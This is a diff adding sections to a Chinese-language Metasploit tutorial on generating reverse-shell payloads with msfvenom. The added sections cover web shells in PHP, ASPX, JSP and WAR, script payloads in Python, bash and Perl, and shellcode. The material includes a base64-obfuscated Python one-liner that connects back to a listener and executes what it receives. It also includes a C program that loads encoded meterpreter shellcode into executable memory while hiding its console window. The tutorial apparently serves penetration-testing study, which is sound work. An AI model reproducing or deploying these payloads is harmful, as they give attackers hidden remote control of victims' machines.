@@ -176,20 +176,125 @@ save -> 將當前設置值保存下來，以便下次啟動MSF終端時仍可使
   + set lhosts ip address(這裡的ip要跟msfvenom設置的一樣)
   + set lport port(這裡的port要跟msfvenom設置的一樣)
   + run
-![image](https://user-images.githubusercontent.com/96654161/170609024-8da25c58-3b6b-4f84-9b3a-3fcecc249ac0.png)
+![image](https://user-images.githubusercontent.com/96654161/170618722-e0d4750b-e277-406f-9165-2452280951b6.png)
   
 >運行成功的話，會在被攻擊機上成功執行該payload，可以在工作管理員查看
-  ![image](https://user-images.githubusercontent.com/96654161/170609271-ac65f0d2-90f1-4b8d-8fdd-b4045ecc8af6.png)
-
-
-  
-  
-  
-  
- 
+![image](https://user-images.githubusercontent.com/96654161/170618573-3f33b4e9-2795-474d-aa07-f4732abde311.png)
 
 + mac
   + msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f macho > shell.macho
+  
++ web payload
+  + php (因為前面--list formats列出的所有格式中沒有php的輸出格式，所以在這裡可以用raw去生成)
+    + msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f raw > shell.php
+    + msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.xx.xxx LPORT=xxxx -f raw -o /root/Desktop/shell_.php
+      + use exploit/multi/handler
+      + set payload php/meterpreter/reverse_tcp
+      + options
+      + set lhost ip (要跟msfvenom設置的ip一樣)
+      + set lport port (要跟msfvenom設置的port一樣)
+      + run
+  + asp
+    + msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f aspx -o shell.aspx
+  + jsp
+    + msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f raw > shell.jsp
+  + war
+    + msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f war > shel.war
+ 
++ 腳本 payload
+  + python
+    + msfvenom -p python/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port to connect ON> -f raw >shell.py
+      + 生成出的shell.py，將內容複製到被攻擊機器上的cmd
+      + python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMzAuMTMxJyw4Nzg3KSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0]))"
+    + 開啟msfconsole
+      + set payload python/meterpreter/reverse_tcp
+      + options
+      + set lhost ip (要跟msfvenom設置的ip一樣)
+      + set lport port (要跟msfvenom設置的port一樣)
+      + run
+  ![image](https://user-images.githubusercontent.com/96654161/170620929-8a7d7a3e-f919-4c49-b9f5-1fda69bdc368.png)
+  + bash
+    + msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Port to connect ON> -f raw >shell.sh
+  + perl
+    + msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Port to connect ON> -f raw >shell.pl
+ 
++ shellcode
+  + windows
+    + msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f <language>
+      + msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.xxx.xxx LPORT=xxxx -e x86/shikata_ga_nai -i 6 -b '\x00' -f c -o shell.c
+      + 申請動態內存加載shellcode
+      + ![image](https://user-images.githubusercontent.com/96654161/170624239-63d80625-085e-428f-8cbc-f8d90164476d.png)
+      + set payload windows/meterpreter/reverse_tcp
+      + set lhost ip (要跟msfvenom設置的ip一樣)
+      + set lport port (要跟msfvenom設置的port一樣)
+      + run
+![image](https://user-images.githubusercontent.com/96654161/170626579-1812f21f-4768-4eae-8c35-b7a3b1507ec0.png)
+
+```c=
+// 申請動態內存加載shellcode
+#include <Windows.h>
+#include <stdio.h>
+#include <string.h>
+
+#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")// windows控制台程序不出黑窗口
+
+unsigned char buf[] =
+"\xbe\x7c\xd5\x22\xc5\xd9\xc5\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
+"\x7b\x83\xc0\x04\x31\x70\x0f\x03\x70\x73\x37\xd7\x7e\xb9\x76"
+"\x20\xa7\x66\xa6\x88\xd3\xbc\xa3\x71\x37\x75\xfa\xf2\x76\xdf"
+"\xe9\xf9\x22\xcb\x92\x14\x2e\x23\xa0\x09\x22\x0e\x0a\xff\xbb"
+"\x27\x1d\xd4\x21\x1f\x87\xe6\x8a\x48\xbf\x7d\x24\x7b\x90\xe2"
+"\x47\xb1\x1c\x6b\x40\x97\x15\x3c\xec\xdc\xbb\x2c\xd5\xc1\xdf"
+"\xda\x05\x22\x71\x42\xb8\xa4\xc7\x2a\x0a\x2e\xe0\xac\x31\xee"
+"\x16\xc5\x45\xce\x3b\x29\x86\x04\x10\x91\xf2\x86\xda\xb9\xab"
+"\x05\xe6\xdc\x96\x55\x02\x09\x8f\x0c\x50\x8a\x96\x17\x25\x02"
+"\xe3\x37\x37\x76\xa7\x2c\x99\x01\x48\xb1\x09\x13\x27\x7b\xc1"
+"\x11\x9a\xd9\xd2\xa5\xd0\x3d\xec\xed\x4c\xda\x57\xaa\x2a\x8f"
+"\x85\x45\xf1\x3e\xc8\x45\x99\x8b\xf8\xde\x2e\x9b\xac\x9d\x89"
+"\xcc\x9c\x44\x86\x88\xf3\xb8\xd2\x46\x14\x9d\xb5\xa0\x0b\x9e"
+"\xd8\x84\x5e\x4c\x9b\x9d\x24\x15\x21\xed\x82\x62\x57\x94\x4f"
+"\x9a\x35\xc7\x0a\x1d\x3f\xa9\x59\xf3\x8e\x4c\x6a\xc9\x6a\x82"
+"\xe8\x5a\xda\x63\x87\x02\x57\xe0\xa9\x5e\x21\x9d\xc5\x9e\x03"
+"\x25\x52\x17\xdf\xc5\x95\x23\x03\x59\x3f\xe4\x0d\x9a\xe2\xad"
+"\x63\x57\xfa\xe9\x78\x5e\xb8\x99\x22\x44\x61\xaf\x27\xa5\xa7"
+"\x6c\xb0\x22\xae\xa6\x1d\x60\xbc\xe1\x78\xe9\x38\x5b\x43\x0e"
+"\xca\xac\x56\x27\x89\x91\x55\x49\x64\x79\x1b\x95\xe7\x31\x40"
+"\x2f\x7e\xf0\x1e\xd0\x88\xe5\xa8\xb3\x11\xdf\xc1\x3e\x4e\x3c"
+"\xe0\x19\x88\x01\xe6\x77\xe9\x2b\x1e\xbf\x6c\x75\x0d\x8e\x5e"
+"\x42\x73\x53\x87\xf0\xbf\x1f\x4b\x6f\xff\x69\x7b\xd0\x4b\xb5"
+"\x58\xc0\x20\x3f\xfe\x64\xa2\x62\x6a\x2a\x35\x6d\x51\xcf\x35"
+"\x37\x1e\x82\xc3\x77\xa2\x8e\x41\x18\x5d\xd6\xfb\x66\xd0\x97"
+"\xbf\xc6\x3f\x7f\x9e\xca\x2a\x31\xb9\x9e\x22\xda\x40\x14\xce"
+"\x81\x12\x5a\xa5\x60\x4e\x79\x0b\x4b\x70\x1a\x04\x77\x7b\x85"
+"\x57\x87\x37\xbd\x6a\xe6\x53\x52\xa5\x7a\x41\xfe\x7a\x8d\xf0"
+"\x58\x4e\xa6\x7f\x6d\x9e\xe9\xf2\x51\x89\x6d\xbe\xd4\xf5\x81"
+"\x60\x8e\x4d\xd1\x8b\xae\x01\xa9\xad\x2f\x49\xc8\xaa\xd7\x47"
+"\x51\xb2\xe1\x40\x0a\xbc\x8b\xdf\x4d\xc3\x82\xeb\xda\x13\x9a"
+"\x43\xd3\x1d\xc8\x83\x61\x3c\x98\x6f\x49\x89\x21\x25\xb6\x83"
+"\x1c\x83\xdf\x5b\x5b\x65\x71\x80\x7d\xbf\x89\xcd\x4f\x03\x53"
+"\x6a\xaa\x67\x98\x64\x64\xc7\x52\xe9\x38\xe1\xd7\x69\xc5\x19"
+"\x56\x53\xcd\x5c\x08\x7f";
+//把剛剛生成的shell.c丟進來
+
+main()
+{
+    char* Memory;
+    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(Memory, buf, sizeof(buf));
+    ((void (*)())Memory)();
+}
+  
+```
+  + linux
+    + msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f <language>
+  + mac
+    + msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f <language>
+  
+  
+  
+  
+  
+  
   
   
 
